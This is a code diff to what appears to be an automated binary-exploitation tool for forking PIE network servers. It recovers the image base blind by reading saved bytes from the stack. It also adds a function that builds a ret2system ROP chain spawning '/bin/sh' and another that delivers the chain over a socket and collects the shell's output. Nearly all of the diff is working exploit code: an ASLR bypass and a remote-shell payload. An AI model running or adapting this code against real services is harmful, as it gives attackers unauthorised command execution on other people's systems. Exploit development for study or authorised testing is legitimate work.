@@ -199,32 +199,99 @@ def read_saved_bytes(survives, offset: int, nbytes: int) -> bytes:
     return bytes(known)
 
 
-def _return_value(known: bytes, ret_low12: int):
-    """The 8-byte little-endian window in `known` that is the saved RETURN address: its low 12 bits
-    equal the (page-invariant) low 12 bits of the return site, and it is a canonical userspace
-    code pointer. The saved rbp in the same read is a STACK pointer and is rejected by the low-12
-    check -- that is how the code pointer is told apart without a leak."""
+# A Linux PIE main image loads at 0x55xx.../0x56xx... under ASLR; the stack and libc live up at
+# 0x7fxx.... This window isolates the saved RETURN address (an image code pointer) from the saved
+# rbp (a stack pointer) in the same read, with no leak.
+_IMG_LO, _IMG_HI = 0x400000, 0x600000000000
+
+
+def _image_pointer(known: bytes):
+    """The first 8-byte little-endian window in `known` that looks like a main-image code pointer
+    (the saved return address), skipping the saved rbp (a high stack pointer)."""
     for i in range(0, max(0, len(known) - 7)):
         v = int.from_bytes(known[i:i + 8], "little")
-        if (v & 0xFFF) == (ret_low12 & 0xFFF) and 0x400000 <= v < 0x800000000000:
+        if _IMG_LO <= v < _IMG_HI:
             return v
     return None
 
 
-def recover_pie_base_blind(survives, ret_site_off: int, *, offset=None, read_words: int = 2):
+def recover_pie_base_blind(survives, *, target_bytes=None, ret_site_off=None, offset=None,
+                           read_words: int = 2):
     """Recover a forking PIE server's image base with NO leak and NO win(): find the overflow
-    offset, stack-read the saved return address, and subtract the (static) return-site offset.
-    `ret_site_off` is where in the image the vulnerable call returns to (the instruction after the
-    `call`, from the disassembly). Returns (base, return_address, offset) or None."""
+    offset, stack-read the saved return address, and resolve the base from it. Returns
+    (base, return_address, offset) or None.
+
+    The return address's HIGH bits (the randomised base) read reliably -- a wrong high byte points
+    to an unmapped page and crashes -- but its LOW byte does not (a wrong low byte can still land on
+    valid code in the same 256-byte block and survive). So when `ret_site_off` is known (the
+    autopilot has it: the vulnerable function's caller return site), its page-invariant low 12 bits
+    are FORCED onto the reliably-read high bits rather than blind-read. Blind (only `target_bytes`),
+    the low 12 bits must instead match a call-return site exactly, which needs a clean low-byte read."""
     if offset is None:
         offset = find_overflow_offset(survives)
     if offset is None:
         return None
     known = read_saved_bytes(survives, offset, read_words * 8)
-    ra = _return_value(known, ret_site_off)
-    if ra is None:
+    v = _image_pointer(known)
+    if v is None:
         return None
-    base = ra - ret_site_off
-    if base > 0 and (base & 0xFFF) == 0:
-        return base, ra, offset
+    if ret_site_off is not None:
+        ra = (v & ~0xFFF) | (ret_site_off & 0xFFF)       # force the page-invariant low 12 bits
+        base = ra - ret_site_off
+        if base > 0 and (base & 0xFFF) == 0:
+            return base, ra, offset
+        return None
+    if target_bytes is not None:
+        from . import exploit
+        bases = {v - s for s in exploit._call_return_sites(target_bytes)
+                 if (s & 0xFFF) == (v & 0xFFF) and v - s > 0 and ((v - s) & 0xFFF) == 0}
+        if len(bases) == 1:                              # unambiguous site match
+            return next(iter(bases)), v, offset
     return None
+
+
+def build_ret2system_chain(exe_path, target_bytes, base: int, offset: int):
+    """A system("/bin/sh") ROP payload rebased onto a recovered image `base`: cyclic filler to the
+    saved return address, then [ret-align, pop rdi, &"/bin/sh", system@plt]. Returns the bytes, or
+    None when the image lacks a pop-rdi gadget, a "/bin/sh" string, or a system PLT slot (then the
+    caller needs the libc-leak path instead). No leak and no win() -- the base came from stack
+    reading and every address is image+offset."""
+    from . import rop
+    pop = rop.find_gadget(target_bytes, "pop_rdi")
+    binsh = rop.find_string(target_bytes, b"/bin/sh")
+    system = rop.resolve_plt(exe_path, "system")
+    if pop is None or binsh is None or not system:
+        return None
+    return rop.build_ret2system(offset, base + pop, base + binsh, base + system, 0,
+                                ret_gadget=base + pop + 1)    # pop+1 is the trailing `ret` (align)
+
+
+def drive_socket_shell(port: int, chain: bytes, follow: bytes, *, host: str = "127.0.0.1",
+                       timeout: float = 1.5, gap: float = 0.2) -> bytes:
+    """Deliver a ROP `chain` over one connection, then (after the child's shell has spawned) the
+    `follow` marker command, and return everything the shell writes back over the socket."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((host, port))
+        s.sendall(chain)
+        time.sleep(gap)
+        s.sendall(follow)
+        time.sleep(gap)
+        out = b""
+        try:
+            while True:
+                d = s.recv(4096)
+                if not d:
+                    break
+                out += d
+        except socket.timeout:
+            pass
+        return out
+    except OSError:
+        return b""
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
